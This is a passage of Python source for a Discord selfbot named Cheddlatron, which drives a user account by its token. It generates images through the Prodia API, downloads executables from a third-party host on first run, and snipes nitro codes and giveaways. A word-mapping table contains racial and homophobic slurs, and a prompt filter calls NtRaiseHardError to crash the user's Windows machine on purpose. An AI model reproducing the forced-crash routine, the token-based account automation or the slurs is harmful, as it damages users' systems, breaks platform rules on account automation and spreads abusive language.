                "faggot": "gay social justice warrior",
                "nigger": "deprived poor unkept black person"
            }
    negativity = False
    output = ""
    for word in promptlist:
        if word in pornlist and negativity == False:
            negative = f"{negative} young underage child kid"
            prompt = f"{prompt} adult grown-up twenties over-18"
            negativity = True
        if word in proflist:
            word = proflist[word]
        output = output+word+" "
    prompt = output
    if re.search('(?i)^ch(?:(?:1(?:id\sp@|ld\sp[@o])|i(?:ld\sp[0@o]|id\spo))rn(?:\s)?|lid\sp[0@]rn(?:\s)?|1(?:ld\sprn\s|id\sprn)|ild\spr0?n)$', f"{prompt.lower()}", re.IGNORECASE):
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
        return
    if seed is None:
        seed = random.randint(100000000, 9999999999)
    payload = {
        "new": "true",
        "prompt": f"{prompt}",
        "model": f"{model}",
        "negative_prompt": f"{negative}", 
        "steps": 20,
        "cfg": 10,
        "seed": seed,
        "sampler": "DPM++ 2M Karras",
        "aspect_ratio": "square"
    }
    req = requesters.post(f"https://api.prodia.com/generate", json_data=payload).json()
    id = req['job']
    generating = True
    while generating:
        check = requesters.get(f"https://api.prodia.com/job/{id}")
        resp = check.json()
        if resp['status'] == "succeeded": 
            generating = False
            break
        if resp['status'] == 'generating':
            pass
        if resp['status']  == 'failed':
            heading = "Error"
            body = "An unexpected error has occured.\nPlease try again."
            cmdname = "ERROR"
            await panelmaker(ctx, heading,body,cmdname)
            return
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://images.prodia.xyz/{id}.png") as response:
            buffer = io.BytesIO(await response.read())
            await ctx.send(file=discord.File(buffer, f'Cheddlatron_{model}.png'))

async def apiimg(ctx, url):
    url = str(url)
    media = getmediatype(url)
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            image_data = io.BytesIO(await response.read())
            await ctx.send(file=discord.File(image_data, f'Cheddlatron_IMG.{media}')) 

async def process_messagee(message):
    author = message.author.name
    content = message.content.replace('\n', '<br>')
    profile_image_url = message.author.avatar
    embeds_html = ''
    link_regex = re.compile(r'https?://[^\s/]+(?:/[^\s]*)?')
    for match in link_regex.finditer(content):
        url = match.group()
        extension_match = re.search(r'\.(\w+)(?:\?|$)', url)
        extension = extension_match.group(1).lower() if extension_match else None
        if extension in ('png', 'jpg', 'jpeg', 'gif'):
            embeds_html += f'<img src="{url}" class="image"/></div><br>'
        elif extension in ('mp4', 'webm'):
            embeds_html += f'<video controls class="videoo"><source src="{url}" type="video/{extension}"></video></div><br>'
        else:
            if extension not in ('png', 'jpg', 'jpeg', 'gif', 'mp4', 'webm'):
                async with aiohttp.ClientSession() as session:
                    async with session.get(url) as resp:
                        if resp.status == 200:
                            html_content = await resp.text()
                            soup = bs4(html_content, 'html.parser')
                            og_title = soup.find('meta', property='og:title')
                            og_description = soup.find('meta', property='og:description')
                            og_image = soup.find('meta', property='og:image')
                            theme_color = soup.find('meta', attrs={'name': 'theme-color'})
                            if og_title:
                                title = og_title['content']
                            else:
                                title_tag = soup.find('title')
                                title = title_tag.text.strip() if title_tag else url
                            if og_description:
                                description = og_description['content']
                            elif soup.find('meta', attrs={'name': 'description'}):
                                description = soup.find('meta', attrs={'name': 'description'}).get('content')
                            else:
                                first_heading = soup.find(re.compile(r'h[1-6]'))
                                description = first_heading.get_text() if first_heading else url
                            image_url = og_image['content'] if og_image else ''
                            color = theme_color['content'] if theme_color else '#cccccc'
                            if color.startswith("rgba"):
                                rgba_values = color.strip("rgba()").split(",")
                                rgba_values = [int(val) for val in rgba_values[:3]]
                                color = '#{:02x}{:02x}{:02x}'.format(*rgba_values)
                            
                            embeds_html += f'''
                                <div class="embed" style="border-left: 5px solid {color};">
                                    <div class="embed-content">
                                        <div class="embed-title" style="padding: 3px;color: #00A8FC;"><a href="{url}" target="_blank"><b>{title}</b></a></div>
                                        <div class="embed-description" style="padding-left: 5px">{description}</div>
                                        <div class="embed-media">
                                            {f'<div class="embed-image-container"><img src="{image_url}" class="embed-image"/></div>' if image_url else ''}
                                        </div>
                                    </div>
                                </div><br>
                            '''
                        else:
                            embeds_html += f'<a href="{url}" target="_blank">{url}</a><br>'

    attachments_html = ''
    if message.attachments:
        for attachment in message.attachments:
            content_type = attachment.content_type.lower() if attachment.content_type else None
            if content_type:
                if 'image' in content_type:
                    attachments_html += f'<img src="{attachment.proxy_url}" class="image"/><br>'
                elif 'video' in content_type:
                    attachments_html += f'<video controls class="videoo"><source src="{attachment.proxy_url}" type="{content_type}"></video></div><br>'
                elif 'audio' in content_type:
                    attachments_html += f'<audio controls class="audio"><source src="{attachment.url}" type="{content_type}"></audio><br>'
                else:
                    attachments_html += f'<a href="{attachment.proxy_url}" download="{attachment.filename}">{attachment.filename}</a><br>'
    content_with_emojis = content
    for emoji_match in re.finditer(r'<a?:(\w+):(\d+)>|(:\w+:)', message.content):
        emoji_name = emoji_match.group(1)
        emoji_id = emoji_match.group(2)
        emoji_code = f"<:{emoji_name}:{emoji_id}>" if emoji_id else f"{emoji_match.group()}"
        has_text = any(c.isalpha() or c.isdigit() or c in string.punctuation for c in filter(lambda x: ord(x) < 128, message.content.replace(emoji_code, '')))
        emoji_size = '1em' if has_text else '3em'
        if emoji_id:
            emoji_url = f'https://cdn.discordapp.com/emojis/{emoji_id}'
            content_with_emojis = content_with_emojis.replace(emoji_match.group(), f'<img src="{emoji_url}.{"gif" if message.content.startswith("<a:") else "png"}" style="height: {emoji_size}; width: {emoji_size};"/>')
        elif emoji_name:
            emoji_obj = discord.utils.get(message.emojis, name=emoji_name)
            if emoji_obj:
                emoji_url = emoji_obj.url
                content_with_emojis = content_with_emojis.replace(emoji_match.group(), f'<img src="{emoji_url}" style="height: {emoji_size}; width: {emoji_size};"/>')

    return f'''
        <div class="message">
            <img src="{profile_image_url}" class="profile-image"/>
            <div class="message-content">
                <div class="message-header">
                    <span class="author">{author}</span>
                    <span class="timestamp">{message.created_at.strftime('%Y-%m-%d %H:%M:%S')}</span>
                </div>
                <span>{content_with_emojis}</span>
                {embeds_html}
                {attachments_html}
            </div>
        </div>
    '''
#FUNCTIONS---------------------------------------------------------------------------------------------------------------------------------------------------------------------------


#MAKE FOLDER AND FILES---------------------------------------------------------------------------------------------------------------------------------------------------------------
def create_folder(path):
    os.makedirs(path, exist_ok=True)

def download_file(url, path):
    response = requesters.get(url)
    with open(path, 'wb') as f:
        f.write(response.content)

def downloadshit():
    if not os.path.exists('config.json'):
        with open('config.json', 'w') as f:
            f.write('{\n}')
        print("Creating config.json")

    os_name = platform.system().lower()

    if os_name == 'windows':
        updater_file = ('Updater.exe', 'https://3l.wtf/BotAssets/FirstRunAssets/Updater.exe')
        icon_file = ('cheddlatronlogo.ico', 'https://3l.wtf/BotAssets/FirstRunAssets/cheddlatronlogo.ico')
    elif os_name == 'darwin': 
        updater_file = ('Cheddlatron-macOS', 'https://3l.wtf/BotAssets/FirstRunAssets/Cheddlatron-macOS')
        icon_file = ('cheddlatronlogo.icns', 'https://3l.wtf/BotAssets/FirstRunAssets/cheddlatronlogo.icns')
    elif os_name == 'linux':
        updater_file = ('Cheddlatron-Linux', 'https://3l.wtf/BotAssets/FirstRunAssets/Cheddlatron-Linux')
        icon_file = ('cheddlatronlogo.png', 'https://3l.wtf/BotAssets/FirstRunAssets/cheddlatronlogo.png')
    else:
        print("Unsupported operating system - Report in the Discord")
        return

    file_locations = [
        ('Boogaloo-Regular.ttf', 'https://3l.wtf/BotAssets/FirstRunAssets/Boogaloo-Regular.ttf'),
        updater_file,
        icon_file,
        ('Data', None),
        ('Data/rpc_configs', None),
        ('Data/Themes', None),
        ('Data/Settings', None),
        ('Data/Media', None),
        ('Data/CustomCmds', None),
        ('Data/Profiles', None),
        ('Data/Logs', None),
        ('Data/Settings/Configs', None),
        ('Data/Settings/Configs/Ethemes', None),
        ('Data/Dumps/Ban Lists', None),
        ('Data/Dumps', None),
        ('Data/Dumps/Dumped Emojis', None),
        ('Data/Dumps/Dumped Chats', None),
        ('Data/Media/Photos', None),
        ('Data/Backups', None),
        ('Data/Media/Downloaded Youtube Videos', None),
        ('Data/Settings/Configs/cacert.pem', 'https://3l.wtf/BotAssets/FirstRunAssets/cacert.pem'),
        # SETTINGS FILE + DATA
        ('Data//Settings//Configs//Settings.json', {}),
        ('Data//Settings//Configs//aliases.json', {}),
        # RPC FILE + DATA
        ('Data/rpc_configs/rpc.json', {
            "Title": "Cheddlatron",
            "Description": "Selfbot",
            "Large_Image": "https://3l.wtf/BotAssets/FirstRunAssets/cheddlatronlogo.png",
            "Small_Image": "",
            "Large_Image_Text": "Wraith was here",
            "Small_Image_Text": "",
            "Status": "dnd",
            "State": "Playing",
            "SubText": "King of Selfbots!",
            "Timer": True,
            "Watch_Url": "",
            "Buttons": [
                {
                    "label": "Cheddlatron.com",
                    "url": "https://cheddlatron.com"
                },
                {
                    "label": "Discord",
                    "url": "https://discord.gg/cheddlatron"
                }
            ]
        }),
        #console rpc
        ('Data/rpc_configs/console.json', {
            "Title": "Cheddlatron",
            "Description": "Selfbot",
            "SubText": "King of Selfbots!",
            "Large_Image": "https://3l.wtf/BotAssets/FirstRunAssets/cheddlatronlogo.png",
            "Small_Image": "",
            "Large_Image_Text": "Wraith was here",
            "Small_Image_Text": "",
            "Status": "dnd",
            "Timer": True,
            "Platform": "playstation"
        }),
        # SPOTIFY FILE + DATA
        ('Data/rpc_configs/spotify.json', {
            "SongTitle": "Cheddlatron Selfbot",
            "ArtistName": "Wraith",
            "AlbumName": "discord.gg/cheddlatron",
            "Image": "https://3l.wtf/BotAssets/FirstRunAssets/cheddlatronlogo.png",
            "SongLength": 120,
            "Status": "dnd",
            "Buttons": True,
            "albumid": "6eUW0wxWtzkFdaEFsTJto6"
        }),
        # TOKENS FILE + DATA
        ('Data//Settings//Configs//Tokens.json', {
            "Token1": "",
            "Token2": "",
            "Token3": "",
        }),
        # WEBEMBED FILE + DATA
        ('Data//Settings//Configs//Ethemes//Default.json', {
            "title_url": "https://3l.wtf",
            "color": "#AB3939",
            "image": "https://3l.wtf/BotAssets/FirstRunAssets/cheddlatron_logo.png",
            "large": True,
            "cmd_url": "https://3l.wtf",
            "author_name": "Cheddlatron",
            "author_url": "https://3l.wtf"
        }),
        # WEBHOOK FILE + DATA
        ('Data//Settings//Configs//Webhooks.json', {
            "Webhook_Avatar": "https://3l.wtf/BotAssets/FirstRunAssets/cheddlatron_logo.png",
            "Webhook_Username": "Cheddlatron Logs",
            "Webhook_Colour": 11221305,
            "Webhook_Footer": "",
            "Webhook_Image": "https://3l.wtf/BotAssets/FirstRunAssets/cheddlatron_logo.png"
        }),
    ]

    for file_or_folder, url_or_content in file_locations:
        path = os.path.join(*file_or_folder.split('/'))
        if os.path.exists(path):
            continue
        if url_or_content is None:
            create_folder(path)
        else:
            if isinstance(url_or_content, dict):
                with open(path, 'w') as f:
                    json.dump(url_or_content, f, indent=4)
                print(f"Creating {file_or_folder}")
            else:
                download_file(url_or_content, path)

if os.path.exists('proxies.txt'):
    pass
else:
    with open("proxies.txt", 'w') as file:
        file.write("Format: http://USER:PASS@HOST:PORT")

#MAKE FOLDER AND FILES---------------------------------------------------------------------------------------------------------------------------------------------------------------


#CONFIGING---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def config():
    config_data = open_config_read()
    required_settings = [
        "token", "prefix", "delete_timer",
        "pinglogger", "giveaway_sniper", "nitro_sniper", "webhooknotifs", "nitro_webhook_url", "giveaway_webhook_url",
        "pinglogger_webhook_url", "dmlogger_webhook_url", "error_webhook_url",
        "rpc", "etheme", "theme", "afkmode", "embed_mode", "giveaway_delay", "device"
    ]

    if any(setting not in config_data for setting in required_settings):
        os.system('cls' if os.name == 'nt' else 'clear')
        if os.name == 'nt': 
           print(Colorate.Vertical(Colors.purple_to_red,"""
 ██████╗██╗  ██╗███████╗██████╗ ███████╗██╗ ██████╗
██╔════╝██║  ██║██╔════╝██╔══██╗██╔════╝██║██╔════╝
██║     ███████║█████╗  ██║  ██║█████╗  ██║██║  ███╗
██║     ██╔══██║██╔══╝  ██║  ██║██╔══╝  ██║██║   ██║
╚██████╗██║  ██║███████╗██████╔╝██║     ██║╚██████╔╝
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝     ╚═╝ ╚═════╝
\n"""))
    print("IF YOU ARE STUCK ON ANYTHING HERE REFER TO LINK BELLOW")
    print("https://docs.cheddlatron.com")
    open_config_write_if_not_exists(config_data, "token", "Please enter a discord token: ")
    open_config_write_if_not_exists(config_data, "prefix", "Please enter a prefix: ")
    open_config_write_if_not_exists(config_data, "embed_mode", "Please enter an embed mode (web or indent): ")
    open_config_write_if_not_exists(config_data, "delete_timer", "Please enter desired time before command deletion: ")
    open_config_write_if_not_exists(config_data, "rpc", "Would you like discord rich presence (True or False): ")
    open_config_write_if_not_exists(config_data, "pinglogger", "Would you like pings to be logged (True or False): ")
    open_config_write_if_not_exists(config_data, "giveaway_sniper", "Would you like to snipe giveaways (True or False): ")
    open_config_write_if_not_exists(config_data, "giveaway_delay", "How long of a delay would you like on joining giveaways (seconds): ")
    open_config_write_if_not_exists(config_data, "nitro_sniper", "Would you like to snipe nitro (True or False): ")
    open_config_write_if_not_exists(config_data, "webhooknotifs", "Would you like webhook notifications (True or False): ")
    open_config_write_if_not_exists(config_data, "dmlogger_webhook_url", "please enter a webhook url for DM logs if applicable: ")
    open_config_write_if_not_exists(config_data, "error_webhook_url", "please enter a webhook url for error logs if applicable: ")
    open_config_write_if_not_exists(config_data, "nitro_webhook_url", "please enter a webhook url for nitro sniping logs if applicable: ")
    open_config_write_if_not_exists(config_data, "giveaway_webhook_url", "please enter a webhook url for giveaway sniping logs if applicable: ")
    open_config_write_if_not_exists(config_data, "pinglogger_webhook_url", "please enter a webhook url for pinglogging if applicable: ")
    open_config_write_if_not_exists(config_data, "etheme", "Please enter desired custom embed theme (leave blank for default): ")
    open_config_write_if_not_exists(config_data, "theme", "Please enter desired custom console theme (needs file extension) (leave blank for default): ")
    open_config_write_if_not_exists(config_data, "afkmode", "Would you like to enable AFK Mode (True or False): ")
    open_config_write_if_not_exists(config_data, "afkmsg", "Please enter desired message to be sent when AFK: ")
    open_config_write_if_not_exists(config_data, "device", "Please enter the device you want the bot to be displayed as (console, desktop, mobile, web): ")

#CONFIGING---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

downloadshit()
try:
    if tokenvalid(config_get('token')):
        pass
    else:
        del_value('token')
except:
    pass
config()
Cheddlatron = commands.Bot(command_prefix = config_get("prefix"), case_insensitive=True, help_command=None)

#MAIN MENU------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def terminalui():
 api.cls()
 if config_get("theme") == "":
    title = f"""{Fore.WHITE}
{Fore.LIGHTWHITE_EX} ██████{Fore.RED}╗{Fore.LIGHTWHITE_EX}██{Fore.RED}╗  {Fore.LIGHTWHITE_EX}██{Fore.RED}╗{Fore.LIGHTWHITE_EX}███████{Fore.RED}╗{Fore.LIGHTWHITE_EX}██████{Fore.RED}╗ {Fore.LIGHTWHITE_EX}██████{Fore.RED}╗ {Fore.LIGHTWHITE_EX}██{Fore.RED}╗      {Fore.LIGHTWHITE_EX}█████{Fore.RED}╗ {Fore.LIGHTWHITE_EX}████████{Fore.RED}╗{Fore.LIGHTWHITE_EX}██████{Fore.RED}╗  {Fore.LIGHTWHITE_EX}██████{Fore.RED}╗ {Fore.LIGHTWHITE_EX}███{Fore.RED}╗   {Fore.LIGHTWHITE_EX}██{Fore.RED}╗
{Fore.LIGHTWHITE_EX}██{Fore.RED}╔════╝{Fore.LIGHTWHITE_EX}██{Fore.RED}║  {Fore.LIGHTWHITE_EX}██{Fore.RED}║{Fore.LIGHTWHITE_EX}██{Fore.RED}╔════╝{Fore.LIGHTWHITE_EX}██{Fore.RED}╔══{Fore.LIGHTWHITE_EX}██{Fore.RED}╗{Fore.LIGHTWHITE_EX}██{Fore.RED}╔══{Fore.LIGHTWHITE_EX}██{Fore.RED}╗{Fore.LIGHTWHITE_EX}██{Fore.RED}║     {Fore.LIGHTWHITE_EX}██{Fore.RED}╔══{Fore.LIGHTWHITE_EX}██{Fore.RED}╗╚══{Fore.LIGHTWHITE_EX}██{Fore.RED}╔══╝{Fore.LIGHTWHITE_EX}██{Fore.RED}╔══{Fore.LIGHTWHITE_EX}██{Fore.RED}╗{Fore.LIGHTWHITE_EX}██{Fore.RED}╔═══{Fore.LIGHTWHITE_EX}██{Fore.RED}╗{Fore.LIGHTWHITE_EX}████{Fore.RED}╗  {Fore.LIGHTWHITE_EX}██{Fore.RED}║
 {Fore.LIGHTWHITE_EX}██{Fore.RED}║     {Fore.LIGHTWHITE_EX}███████{Fore.RED}║{Fore.LIGHTWHITE_EX}█████{Fore.RED}╗  {Fore.LIGHTWHITE_EX}██{Fore.RED}║  {Fore.LIGHTWHITE_EX}██{Fore.RED}║{Fore.LIGHTWHITE_EX}██{Fore.RED}║  {Fore.LIGHTWHITE_EX}██{Fore.RED}║{Fore.LIGHTWHITE_EX}██{Fore.RED}║     {Fore.LIGHTWHITE_EX}███████{Fore.RED}║   {Fore.LIGHTWHITE_EX}██{Fore.RED}║   {Fore.LIGHTWHITE_EX}██████{Fore.RED}╔╝{Fore.LIGHTWHITE_EX}██{Fore.RED}║   {Fore.LIGHTWHITE_EX}██{Fore.RED}║{Fore.LIGHTWHITE_EX}██{Fore.RED}╔{Fore.LIGHTWHITE_EX}██{Fore.RED}╗ {Fore.LIGHTWHITE_EX}██{Fore.RED}║ 
 {Fore.LIGHTWHITE_EX}██{Fore.RED}║     {Fore.LIGHTWHITE_EX}██{Fore.RED}╔══{Fore.LIGHTWHITE_EX}██{Fore.RED}║{Fore.LIGHTWHITE_EX}██{Fore.RED}╔══╝  {Fore.LIGHTWHITE_EX}██{Fore.RED}║  {Fore.LIGHTWHITE_EX}██{Fore.RED}║{Fore.LIGHTWHITE_EX}██{Fore.RED}║  {Fore.LIGHTWHITE_EX}██{Fore.RED}║{Fore.LIGHTWHITE_EX}██{Fore.RED}║     {Fore.LIGHTWHITE_EX}██{Fore.RED}╔══{Fore.LIGHTWHITE_EX}██{Fore.RED}║   {Fore.LIGHTWHITE_EX}██{Fore.RED}║   {Fore.LIGHTWHITE_EX}██{Fore.RED}╔══{Fore.LIGHTWHITE_EX}██{Fore.RED}╗{Fore.LIGHTWHITE_EX}██{Fore.RED}║   {Fore.LIGHTWHITE_EX}██{Fore.RED}║{Fore.LIGHTWHITE_EX}██{Fore.RED}║╚{Fore.LIGHTWHITE_EX}██{Fore.RED}╗{Fore.LIGHTWHITE_EX}██{Fore.RED}║ 
 {Fore.RED}╚{Fore.LIGHTWHITE_EX}██████{Fore.RED}╗{Fore.LIGHTWHITE_EX}██{Fore.RED}║  {Fore.LIGHTWHITE_EX}██{Fore.RED}║{Fore.LIGHTWHITE_EX}███████{Fore.RED}╗{Fore.LIGHTWHITE_EX}██████{Fore.RED}╔╝{Fore.LIGHTWHITE_EX}██████{Fore.RED}╔╝{Fore.LIGHTWHITE_EX}███████{Fore.RED}╗{Fore.LIGHTWHITE_EX}██{Fore.RED}║  {Fore.LIGHTWHITE_EX}██{Fore.RED}║   {Fore.LIGHTWHITE_EX}██{Fore.RED}║   {Fore.LIGHTWHITE_EX}██{Fore.RED}║  {Fore.LIGHTWHITE_EX}██{Fore.RED}║╚{Fore.LIGHTWHITE_EX}██████{Fore.RED}╔╝{Fore.LIGHTWHITE_EX}██{Fore.RED}║ ╚{Fore.LIGHTWHITE_EX}████{Fore.RED}║ 
{Fore.RED} ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
""".strip()

    api.printcenter(title)
    print("═════════════════════════════════════════════════════════════════════════════════════════════════════")
 else:
    read_theme(config_get("theme"))
#MAIN MENU------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@Cheddlatron.command(name=f'{config_get("prefix")}{config_get("prefix")}') 
async def DONOTREMOVETHIS(ctx):
    pass
#ON CONNECT------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
async def retardpresence():
    ws = Cheddlatron._get_websocket()
    if config_get('rpc') == "":
        req = requesters.get("https://discord.com/api/v9/users/@me/settings-proto/1", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
        settings = base64.b64decode(req['settings']).decode('utf-8', errors='ignore')
        if "invisible" in settings:
            Status = "invisible"
        elif "online" in settings:
            Status = "online"
        elif "idle" in settings:
            Status = "idle"
        else:
            Status = "dnd"
        jasondata = {"op": 3, "d":{"status": Status, "since": 0, "activities": [], "afk": True}}
        try:
            await ws.send_as_json(jasondata)
            logging.info("WebSocket message sent")
        except Exception as e:
            logging.error(f"WebSocket send failed: {e}")
            return 0

    #RetardPresence Link Checker
    async def RetardPresenceLinkChecker(link):
        regex = r'^(?:https?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/|twitch\.tv\/)((?:[^\/\s]+\/)*[^\/\s]+)$'
        if re.search(regex, link):
            return True
        return False

    #RetardPresence Searcher
    async def RetardPresenceSearcher(item_name):
        item_name = item_name + ".json"
        for dirpath, dirnames, filenames in os.walk('Data/rpc_configs'):
            if item_name in dirnames:
                return os.path.join(dirpath, item_name), "folder"
            if item_name in filenames:
                return os.path.join(dirpath, item_name), "file"
        return None, None

    #RetardPresence Type
    async def RetardPresenceType(RetardPresenceData):
        if "SongLength" in RetardPresenceData:
            RetardPresenceType = "spotify"
        elif "Platform" in RetardPresenceData:
            RetardPresenceType = "console"
        else:
            RetardPresenceType = "normal"
        return RetardPresenceType

    #RetardPresence Button Builder
    async def RetardPresenceButtonBuilder(RetardPresenceData):
        labels = []
        urls = []
        buttons = RetardPresenceData.get("Buttons")
        for button in buttons:
            labels.append(button["label"])
            urls.append(button["url"])
        return labels, urls

    #RetardPresence Builder
    async def RetardPresenceBuilder():

        RetardPresenceDir, fileorfolder = await RetardPresenceSearcher(config_get('rpc'))
        if fileorfolder == "file":
            with open(RetardPresenceDir, "r") as RetardPresenceFile:
                RetardPresenceConfig = json.load(RetardPresenceFile)
            RetardPresenceTyping = await RetardPresenceType(RetardPresenceConfig)

        #Normal RPC

            if RetardPresenceTyping == "normal":
                Title = RetardPresenceConfig.get("Title")
                if Title == "" or Title == " ":
                    Title = "‎"

                Description = RetardPresenceConfig.get("Description")
                if Description == "" or Description == " ":
                    Description = "‎"

                Sub_Text = RetardPresenceConfig.get("SubText")
                if Sub_Text == "" or Sub_Text == " ":
                    Sub_Text = None

                Large_Image = RetardPresenceConfig.get("Large_Image")
                if Large_Image == "" or Large_Image == " " or requesters.get(Large_Image).status_code != 200:
                    Large_Image = "https://cheddlatron.com/BotAssets/Avatar/Invis.png"
                Large_Image = getExternalToken(Large_Image)

                Small_Image = RetardPresenceConfig.get("Small_Image")
                if Small_Image == "" or Small_Image == " " or requesters.get(Small_Image).status_code != 200:
                    Small_Image = None
                if Small_Image:
                    Small_Image = getExternalToken(Small_Image)

                Large_Image_Text = RetardPresenceConfig.get("Large_Image_Text")
                if Large_Image_Text == "" or Large_Image_Text == " ":
                    Large_Image_Text = None

                Small_Image_Text = RetardPresenceConfig.get("Small_Image_Text")
                if Small_Image_Text == "" or Small_Image_Text == " ":
                    Small_Image_Text = None

                Status = RetardPresenceConfig.get("Status")
                if Status.lower() !=  "dnd" or Status.lower() != "online" or Status.lower() != "idle":
                    req = requesters.get("https://discord.com/api/v9/users/@me/settings-proto/1", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
                    settings = base64.b64decode(req['settings']).decode('utf-8', errors='ignore')
                    if "invisible" in settings:
                        Status = "dnd"
                    elif "online" in settings:
                        Status = "online"
                    elif "idle" in settings:
                        Status = "idle"
                    else:
                        Status = "dnd"
 
                State = RetardPresenceConfig.get("State")
                if State.lower() == "playing":
                    State = 0
                elif State.lower() == "streaming":
                    State = 1
                elif State.lower() == "listening":
                    State = 2
                elif State.lower() == "watching":
                    State = 3
                elif State.lower() == "competing":
                    State = 5
                else:
                    State = 0

                Timer = RetardPresenceConfig.get("Timer")
                if Timer == True:
                    Timer = start_time*1000
                else:
                    Timer = None

                RetardPresenceLabels, RetardPresenceUrls = await RetardPresenceButtonBuilder(RetardPresenceConfig)
                if RetardPresenceLabels == [] or RetardPresenceUrls == []:
                    RetardPresenceUrls = None
                    RetardPresenceLabels = None
                try:
                    if len(RetardPresenceLabels) > 2 or len(RetardPresenceUrls) > 2:
                        RetardPresenceUrls = RetardPresenceUrls[:2]
                        RetardPresenceLabels = RetardPresenceLabels[:2]
                except:
                    pass

                RetardPresenceWebsocketJson = {
                    "op": 3,
                    "d":{
                        "status": Status,
                        "since": 0,
                        "activities": [
                            {
                                "state": Sub_Text,
                                "details": Description,
                                "timestamps": {
                                    "start": Timer
                                },
                                "assets": {
                                    "large_image": Large_Image,
                                    "large_text": Large_Image_Text,
                                    "small_image": Small_Image,
                                    "small_text": Small_Image_Text
                                },
                                "buttons": RetardPresenceLabels,
                                "name": Title,
                                "application_id": "1298647912456257557",
                                "flags": 1,
                                "type": State,
                                "metadata": {
                                    "button_urls": RetardPresenceUrls,
                                },

                            }
                        ],
                        "afk": True
                    }
                }

                if State == 1: 
                    if await RetardPresenceLinkChecker(RetardPresenceConfig.get('Watch_Url')):
                        Watch_Url = RetardPresenceConfig.get('Watch_Url')
                        RetardPresenceWebsocketJson["d"]["activities"][0]["url"] = Watch_Url

                return RetardPresenceWebsocketJson

        #Spotify RPC

            elif RetardPresenceTyping == "spotify":
                Title = RetardPresenceConfig.get("SongTitle")
                if Title == "" or Title == " ":
                    Title = "‎"
                
                ArtistName = RetardPresenceConfig.get("ArtistName")
                if ArtistName == "" or ArtistName == " ":
                    ArtistName = "‎"
                
                AlbumName = RetardPresenceConfig.get("AlbumName")
                if AlbumName == "" or AlbumName == " ":
                    AlbumName = "‎"

                Image = RetardPresenceConfig.get("Image")
                if Image == "" or Image == " " or requesters.get(Image).status_code != 200:
                    Image = "https://cheddlatron.com/BotAssets/Avatar/Invis.png"
                Image = getExternalToken(Image)

                SongLength = RetardPresenceConfig.get("SongLength")
                try:
                    int(SongLength)
                except:
                    SongLength = 120

                Status = RetardPresenceConfig.get("Status")
                if Status.lower() !=  "dnd" or Status.lower() != "online" or Status.lower() != "idle":
                    req = requesters.get("https://discord.com/api/v9/users/@me/settings-proto/1", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
                    settings = base64.b64decode(req['settings']).decode('utf-8', errors='ignore')
                    if "invisible" in settings:
                        Status = "dnd"
                    elif "online" in settings:
                        Status = "online"
                    elif "idle" in settings:
                        Status = "idle"
                    else:
                        Status = "dnd"

                Buttons = RetardPresenceConfig.get('Buttons')
                if Buttons == True or Buttons == False:
                    pass
                else:
                    Buttons == True
                if Buttons:
                    flags = 48
                    id = "spotify1"
                else:
                    flags = None
                    id = None

                albumid = RetardPresenceConfig.get("AlbumID")
                if albumid == "" or albumid == " ":
                    albumid = "6eUW0wxWtzkFdaEFsTJto6"

                RetardPresenceWebsocketJson = {
                    "op": 3,
                    "d": {
                        "status": Status,
                        "since": 0,
                        "activities": [{
                            "type": 2,
                            "name": "Spotify",
                            "assets": {
                                "large_image": Image,
                                "large_text": AlbumName
                            },
                            "details": Title,
                            "state": ArtistName,
                            "timestamps": {
                                "start": start_time*1000,
                                "end": ((start_time*1000) + SongLength * 1000)
                            },
                            "party": {
                                "id": f"spotify:{Cheddlatron.user.id}"
                            },
                            "id": id,
                            "flags": flags,
                            "metadata": {
                                "album_id": albumid
                            },
                            "instance": True
                        }],
                        "afk": True
                    }
                } 
                
                return RetardPresenceWebsocketJson
            
        #console rpc  
            elif RetardPresenceTyping == "console":
                Title = RetardPresenceConfig.get("Title")
                if Title == "" or Title == " ":
                    Title = "‎"

                Description = RetardPresenceConfig.get("Description")
                if Description == "" or Description == " ":
                    Description = "‎"

                Sub_Text = RetardPresenceConfig.get("SubText")
                if Sub_Text == "" or Sub_Text == " ":
                    Sub_Text = None

                Large_Image = RetardPresenceConfig.get("Large_Image")
                if Large_Image == "" or Large_Image == " " or requesters.get(Large_Image).status_code != 200:
                    Large_Image = "https://cheddlatron.com/BotAssets/Avatar/Invis.png"
                Large_Image = getExternalToken(Large_Image)

                Small_Image = RetardPresenceConfig.get("Small_Image")
                if Small_Image == "" or Small_Image == " " or requesters.get(Small_Image).status_code != 200:
                    Small_Image = None
                if Small_Image:
                    Small_Image = getExternalToken(Small_Image)

                Large_Image_Text = RetardPresenceConfig.get("Large_Image_Text")
                if Large_Image_Text == "" or Large_Image_Text == " ":
                    Large_Image_Text = None

                Small_Image_Text = RetardPresenceConfig.get("Small_Image_Text")
                if Small_Image_Text == "" or Small_Image_Text == " ":
                    Small_Image_Text = None

                Status = RetardPresenceConfig.get("Status")
                if Status.lower() !=  "dnd" or Status.lower() != "online" or Status.lower() != "idle":
                    req = requesters.get("https://discord.com/api/v9/users/@me/settings-proto/1", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()}).json()
                    settings = base64.b64decode(req['settings']).decode('utf-8', errors='ignore')
                    if "invisible" in settings:
                        Status = "dnd"
                    elif "online" in settings:
                        Status = "online"
                    elif "idle" in settings:
                        Status = "idle"
                    else:
                        Status = "dnd"
                
                Timer = RetardPresenceConfig.get("Timer")
                if Timer == True:
                    Timer = start_time*1000
